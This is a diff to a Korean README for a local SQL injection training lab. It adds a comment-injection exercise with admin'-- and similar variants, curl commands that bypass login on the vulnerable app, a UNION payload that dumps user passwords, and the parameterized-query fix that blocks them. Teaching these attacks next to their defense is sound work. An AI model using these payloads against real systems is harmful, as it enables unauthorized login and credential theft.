@@ -32,7 +32,78 @@ query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{pas
 - 비밀번호 없이 로그인 성공
 - 실행된 쿼리: `SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '...'`
 
-## 실습 2: UNION-based SQL Injection
+## 실습 2: SQL Comment Injection (admin'-- 페이로드)
+
+### 취약한 코드
+```python
+query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
+```
+
+### 공격 방법
+1. http://localhost:5001 접속
+2. Username: `admin'--`
+3. Password: 아무 값 (또는 비워둠)
+
+### 동작 원리
+SQL 주석(`--`)을 사용하여 비밀번호 검증 부분을 제거:
+
+```sql
+-- 원래 쿼리
+SELECT * FROM users WHERE username = 'admin' AND password = 'user_input'
+
+-- 페이로드 적용 후
+SELECT * FROM users WHERE username = 'admin'--' AND password = 'anything'
+
+-- 실제 실행되는 쿼리 (-- 뒤는 주석 처리됨)
+SELECT * FROM users WHERE username = 'admin'
+```
+
+### 예상 결과
+- **비밀번호 없이 admin 계정으로 로그인 성공**
+- `AND password = '...'` 부분이 주석 처리되어 무시됨
+- admin 사용자가 존재하면 즉시 인증 통과
+
+### 실습 과정
+```bash
+# 1. 취약한 버전 테스트
+curl -X POST http://localhost:5001/login \
+  -d "username=admin'--&password=anything"
+# 결과: 로그인 성공 (비밀번호 우회)
+
+# 2. 안전한 버전 테스트
+curl -X POST http://localhost:5002/login \
+  -d "username=admin'--&password=anything"
+# 결과: 로그인 실패 (Parameterized Query로 방어)
+```
+
+### 다양한 주석 기법
+```sql
+-- MySQL/PostgreSQL 주석
+admin'--
+admin'-- -
+admin'#
+
+-- 멀티라인 주석
+admin'/*
+
+-- 특수 문자 조합
+admin';--
+admin' OR '1'='1'--
+```
+
+### 방어 확인
+안전한 버전은 Parameterized Query를 사용하여 방어:
+```python
+# secure/app.py
+cursor.execute(
+    "SELECT * FROM users WHERE username = ? AND password = ?",
+    (username, password)
+)
+```
+
+위 방식에서는 `admin'--`가 문자열 리터럴로 처리되어 SQL 주석으로 해석되지 않습니다.
+
+## 실습 3: UNION-based SQL Injection
 
 ### 공격 방법
 1. 검색창에 입력 (검색 쿼리는 3개 컬럼 반환):
@@ -153,26 +224,60 @@ pytest test_app.py::TestSecureApp -v
 cd ch04-sql-injection
 docker-compose up -d
 
-# 취약한 버전 - Authentication Bypass
+# 취약한 버전 - Authentication Bypass (OR 1=1)
 curl -X POST http://localhost:5001/login \
   -d "username=' OR '1'='1&password=anything"
+# 결과: 로그인 성공
+
+# 취약한 버전 - SQL Comment Injection (admin'-- 페이로드)
+curl -X POST http://localhost:5001/login \
+  -d "username=admin'--&password=anything"
+# 결과: admin 계정으로 로그인 성공 (비밀번호 우회)
+
+# 취약한 버전 - 다른 사용자로 주석 우회
+curl -X POST http://localhost:5001/login \
+  -d "username=alice'--&password=wrong"
+# 결과: alice 계정으로 로그인 성공
 
 # 취약한 버전 - UNION Injection
 curl "http://localhost:5001/search?q=' UNION SELECT id, username, password FROM users--"
+# 결과: 모든 사용자의 비밀번호 노출
 
-# 안전한 버전 테스트
+# 안전한 버전 - Authentication Bypass 차단
 curl -X POST http://localhost:5002/login \
   -d "username=' OR '1'='1&password=anything"
+# 결과: 로그인 실패
+
+# 안전한 버전 - SQL Comment Injection 차단
+curl -X POST http://localhost:5002/login \
+  -d "username=admin'--&password=anything"
+# 결과: 로그인 실패 (Parameterized Query로 방어)
 
 docker-compose down
 ```
 
 ### 4. 수동 테스트
+
+#### 테스트 케이스 1: OR 1=1 공격
 1. http://localhost:5001 접속
 2. Username: `' OR '1'='1`, Password: 아무 값
 3. 로그인 성공 확인 (취약점)
 4. http://localhost:5002에서 동일 테스트
 5. 로그인 실패 확인 (방어 성공)
+
+#### 테스트 케이스 2: SQL Comment Injection (admin'-- 페이로드)
+1. http://localhost:5001 접속
+2. Username: `admin'--`, Password: 비워둠 또는 아무 값
+3. admin 계정으로 로그인 성공 확인 (비밀번호 우회)
+4. 브라우저 개발자 도구 → 네트워크 탭에서 요청 확인
+5. http://localhost:5002에서 동일 테스트
+6. 로그인 실패 확인 (Parameterized Query로 방어)
+
+#### 테스트 케이스 3: 다양한 주석 기법 확인
+취약한 버전(5001)에서 다음 페이로드 테스트:
+- `alice'--` → alice 계정 로그인 성공
+- `admin'#` → admin 계정 로그인 성공 (MySQL)
+- `admin'/*` → admin 계정 로그인 성공 (멀티라인 주석)
 
 ## 보안 스캐닝
 
